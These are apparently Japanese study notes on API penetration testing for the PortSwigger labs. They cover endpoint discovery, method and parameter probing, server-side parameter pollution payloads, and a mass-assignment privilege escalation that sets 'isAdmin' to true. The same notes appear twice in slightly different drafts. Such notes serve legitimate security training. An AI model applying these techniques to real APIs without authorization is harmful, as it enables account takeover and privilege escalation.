# 注目ポイント

- Forgot password機能（Please enter your usernameなど）
- Update your email
- JSON形式のレスポンス
- `/api~` リクエスト

---

# Detection

## APIエンドポイントの発見

以下のいずれかの方法で発見する：

| 方法             | 説明                                                                                                        |
| -------------- | --------------------------------------------------------------------------------------------------------- |
| Brute-force    | `GET /` に対してAPIエンドポイント用🔗[api_wordlist - GitHub](https://github.com/chrislockard/api_wordlist)でブルートフォースする |
| HTTP history   | 一通り探索した後、HTTP historyでAPIへのリクエストを確認する（ログイン後の探索が効果的）                                                       |
| Scanner        | Passive Scanで自動的に検出される                                                                                    |
| JS Link Finder | JavaScriptファイル内のAPIエンドポイントへの参照を見つける（Extension）                                                            |

> [!TIP] エンドポイントを特定したらベースのパスも確認すること。重要な情報が得られることがある。
> 
> ```
> /api/example/v1/users/123
>   ↓ 確認する
> /api/example/v1
> /api/example
> /api
> ```

---

## APIエンドポイントの調査

発見したエンドポイントに対して有効なリクエストを作成するために以下を調査する。

### 利用可能なHTTPメソッドの特定

重要でないオブジェクトを扱うエンドポイントに対してIntruderをかける：

```http
§GET§ /api/v1/<重要でないオブジェクト>
```

- Payload type: Simple list → Add from list → HTTP verbs

### 利用可能なContent-Typeヘッダの特定

発見したエンドポイントに対してContent Type Convertorを使用してリクエストを送り、以下を確認する：

- Content-Typeを変更してもエラーはないか
- エラーメッセージに有用な情報が含まれないか

### 利用可能なパラメータの検出

発見したエンドポイントに対して、Param Miner → Guess GET parametersを使用する。

---

## Server-side Parameter Pollution

サーバー側で正規のパラメータの値を上書きしたり、機密情報を不正に窃取する攻撃。POSTリクエスト × アクション（メール変更・パスワードリセット等）でみられる。平文だけでなくJSONやXML等の構造化データの場合もある。

詳細：🔗[PortSwigger - Server-side parameter pollution](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)

### 検知方法

**確実な手がかり：** Backslash Powered Scannerによって「Suspicious input transformation」が検知されたときはほぼ確実。

**手動での確認：** 正当なパラメータの後ろに `#` や `&` をURLエンコードして付与し、レスポンスがフィールド情報を示唆するものであれば陽性。

```
username=administrator%23hoge   # #をURLエンコード
username=administrator%26hoge   # &をURLエンコード
```

→ [💥API testing](https://claude.ai/chat/%F0%9F%92%A5API%20testing.md#Server-side%20parameter%20pollution)

---

# Exploitation

## 未使用エンドポイントの悪用

調査で発見したHTTPメソッドや `Content-Type` を使用して、任意の値に変更する。

🔗[Lab: Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

---

## Mass Assignment によるPrivEsc

**Mass Assignmentとは：** 隠しパラメータ、または他のエンドポイントへのリクエストに使用されるパラメータを使って、攻撃者の意図する値に変更する攻撃。

### 手順

1. あるAPIエンドポイントへのリクエスト・レスポンスのパラメータを観察する

```json
{
    "username": "wiener",
    "email": "wiener@example.com"
}
```

2. 他のAPIエンドポイントへのリクエスト・レスポンスを観察し、追加のパラメータを探す

```json
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

3. `PATCH` または `POST` リクエストで、他のエンドポイントで使われているパラメータを試す

**正常な値でエラーが出ないか確認：**

```http
PATCH /api/users/

{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": false
}
```

**不正な値でエラーが出るか確認（エラーが出る = パラメータを受け付けている）：**

```http
{
    "isAdmin": hogehoge
}
```

4. パラメータの値を改変してリクエストし、PrivEscを完了する

```http
PATCH /api/users/

{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}
```

🔗[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

---
---

---
## Detect

#### Server-side parameter pollutionの場合

- サーバ側で正規のパラメタの値を上書きしたり不正に機密情報を窃取する攻撃-> [詳細：PortSwigger](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution)
- POSTリクエスト × アクション(メール変更、パスワードリセット等)でみられる。平文だけでなくJSONやXML等構造化データもあり得る

###### Server-side parameter pollution?

- Backslash Powererd Scannerによって"Suspicious input transformation"が検知されたときはほぼ確実
- 正当なパラメタの後ろに`#`や`&`を付与し(urlencode)、レスポンスがフィールド情報を示唆するものであれば検知
```
username=administrator#hoge
```
```
username=administrator&hoge
```
-> [💥API testing](💥API%20testing.md#Server-side%20parameter%20pollution)


↓その他

### APIエンドポイントを発見する

- `GET /` に対してAPIのエンドポイント[wordlist](https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt)でbrute-forceする
	or
- 1通り探索したあと、HTTP historyでapiへのリクエストを確認する(ログイン後の探索がいい)
	or
- Scannerでpassive scanで自動的に検出される
	or
- Extension: JS Link finderからJavaScriptファイル内でAPIエンドポイントへの参照を見つける

- エンドポイントを特定したらベースのpathも閲覧すること。重要情報が得られることもある
	- `/api/example/v1/users/123`↓
		- `/api/example/v1`
		- `/api/example`
		- `/api`

---
### 有効なHTTPリクエスト作成のためのAPIエンドポイントについての調査

###### 利用可能なHTTPメソッドの特定

- 発見したAPIエンドポイントで、かつ重要でないオブジェクトを扱うものに対してIntruderにかける
- Payload type: Simple list -> Add from list -> HTTP verbs
```
§GET§ /api/v1/重要でないオブジェクト
```

###### 利用可能なContent-Typeヘッダの特定

- 発見したAPIエンドポイントに対してContent type convertorを使用しリクエスト
 - Errorによる役立つ情報の開示はあるか？
 - Content-Typeを変更してもエラーはないか？

###### 利用可能なパラメタの検出

- 発見したAPIエンドポイントに対して、Param Miner -> Guess GET parameters

---

# Exploitation

###### 使用されてないエンドポイントを悪用する

- [API testing](API%20testing.md#有効なHTTPリクエスト作成のためのAPIエンドポイントについての調査)で発見したHTTPメソッドや`Content-Type`を使用して任意の値に変更する

[Lab: Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

---
## Mass assignmentを利用したPrivEsc

- Mass assignment = 隠しパラメタ or 他のエンドポイントへのリクエストに使用されるパラメタを使用して攻撃者の意図する値に変更されること

1. あるAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
}
```

2. 同様に、他のAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"id": 123, 
	"name": "John Doe", 
	"email": "john@example.com", 
	"isAdmin": "false" 
}
```

3. `PATCH`メソッド or `POST`メソッドリクエストで、他のエンドポイントで使用されているパラメタを使ってみる

- まずは正常な値を入力し、エラーが返らないか確認する
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": false, 
}
```

- 次に、適当な値を入力し、エラーが返るか確認する。エラーが返る＝パラメタを正常に更新できている
```http
...
	"isAdmin": hogehoge, 
}
```

4. パラメタの値を改変しリクエスト。PrivEsc完了
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": true, 
}
```

[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

